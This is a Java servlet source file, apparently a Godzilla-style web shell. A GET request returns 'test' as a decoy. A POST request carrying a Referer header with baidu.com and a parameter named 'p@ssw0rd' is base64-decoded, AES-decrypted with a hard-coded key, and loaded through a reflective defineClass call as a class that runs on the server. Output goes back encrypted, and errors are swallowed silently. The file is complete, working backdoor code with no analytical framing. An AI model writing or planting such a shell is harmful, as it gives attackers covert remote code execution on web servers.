package demo;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.math.BigInteger;
import java.net.URL;
import java.net.URLClassLoader;
import java.security.MessageDigest;
import java.util.ArrayList;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.Servlet;
import javax.servlet.ServletConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;


public class gzExecutor extends HttpServlet {
    private static final long serialVersionUID = 1L;

    public static String HEADER_KEY = "Referer";
    public static String HEADER_VALUE = "https://www.baidu.com/";
    Class payload;
    String xc = "3c6e0b8a9c15224a";
    String PASS = "p@ssw0rd";

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException, ServletException {
        PrintWriter writer = resp.getWriter();
        writer.write("test");
    }

    @Override
    public void doPost(HttpServletRequest var1, HttpServletResponse var2) {
        try {
            Object var5 = getMethodAndInvoke(var1, "getHeader", new Class[]{String.class}, new Object[]{HEADER_KEY});
            if (var5 != null && var5.toString().contains(HEADER_VALUE)) {
                String var6 = this.PASS;
                String var7 = md5(var6 + this.xc);
                byte[] var8 = base64Decode(getMethodAndInvoke(var1, "getParameter", new Class[]{String.class}, new Object[]{var6}).toString());
                var8 = this.x(var8, false);
                if (this.payload == null) {
                    URLClassLoader var9 = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
                    Method var10 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                    var10.setAccessible(true);
                    this.payload = (Class)var10.invoke(var9, var8, 0, var8.length);
                } else {
                    ByteArrayOutputStream var11 = new ByteArrayOutputStream();
                    Object var12 = this.payload.newInstance();
                    Object var13 = getMethodAndInvoke(var2, "getWriter", (Class[])null, (Object[])null);
                    var12.equals(var11);
                    var12.equals(var8);
                    var12.equals(var1);
                    getMethodAndInvoke(var13, "write", new Class[]{String.class}, new Object[]{var7.substring(0, 16)});
                    var12.toString();
                    getMethodAndInvoke(var13, "write", new Class[]{String.class}, new Object[]{base64Encode(this.x(var11.toByteArray(), true))});
                    getMethodAndInvoke(var13, "write", new Class[]{String.class}, new Object[]{var7.substring(16)});
                    getMethodAndInvoke(var13, "flush", (Class[])null, (Object[])null);
                    getMethodAndInvoke(var13, "close", (Class[])null, (Object[])null);
                }
            }
        } catch (Exception var15) {
        }

    }

    public static byte[] base64Decode(String var0) throws Exception {
        byte[] var2 = null;

        Class var1;
        try {
            var1 = Class.forName("java.util.Base64");
            Object var3 = var1.getDeclaredMethod("getDecoder", null).invoke((Object)null, null);
            var2 = (byte[])var3.getClass().getMethod("decode", String.class).invoke(var3, var0);
        } catch (Exception var8) {
            try {
                var1 = Class.forName("sun.misc.BASE64Decoder");
                Object var5 = var1.newInstance();
                var2 = (byte[])var5.getClass().getMethod("decodeBuffer", String.class).invoke(var5, var0);
            } catch (Exception var7) {
            }
        }

        return var2;
    }

    public static String base64Encode(byte[] var0) throws Exception {
        String var2 = null;

        Class var1;
        try {
            var1 = Class.forName("java.util.Base64");
            Object var3 = var1.getMethod("getEncoder", null).invoke((Object)null, null);
            var2 = (String)var3.getClass().getMethod("encodeToString", byte[].class).invoke(var3, var0);
        } catch (Exception var8) {
            try {
                var1 = Class.forName("sun.misc.BASE64Encoder");
                Object var5 = var1.newInstance();
                var2 = (String)var5.getClass().getMethod("encode", byte[].class).invoke(var5, var0);
            } catch (Exception var7) {
            }
        }

        return var2;
    }

    public static String md5(String var0) {
        String var1 = null;

        try {
            MessageDigest var2 = MessageDigest.getInstance("MD5");
            var2.update(var0.getBytes(), 0, var0.length());
            var1 = (new BigInteger(1, var2.digest())).toString(16).toUpperCase();
        } catch (Exception var4) {
        }

        return var1;
    }

    public byte[] x(byte[] var1, boolean var2) {
        try {
            Cipher var3 = Cipher.getInstance("AES");
            var3.init(var2 ? 1 : 2, new SecretKeySpec(this.xc.getBytes(), "AES"));
            return var3.doFinal(var1);
        } catch (Exception var5) {
            return null;
        }
    }

    public static Object getFieldValue(Object var0, String var1) throws Exception {
        Field var2 = null;
        if (var0 instanceof Field) {
            var2 = (Field)var0;
        } else {
            Class var3 = var0.getClass();

            while(var3 != null) {
                try {
                    var2 = var3.getDeclaredField(var1);
                    var3 = null;
                } catch (Exception var5) {
                    var3 = var3.getSuperclass();
                }
            }
        }

        var2.setAccessible(true);
        return var2.get(var0);
    }

    public static Method getMethodByClass(Class var0, String var1, Class[] var2) {
        Method var3 = null;

        while(var0 != null) {
            try {
                var3 = var0.getDeclaredMethod(var1, var2);
                var3.setAccessible(true);
                var0 = null;
            } catch (Exception var5) {
                var0 = var0.getSuperclass();
            }
        }

        return var3;
    }

    public static Object getMethodAndInvoke(Object var0, String var1, Class[] var2, Object[] var3) {
        try {
            Method var4 = getMethodByClass(var0.getClass(), var1, var2);
            if (var4 != null) {
                return var4.invoke(var0, var3);
            }
        } catch (Exception var6) {
        }

        return null;
    }

}
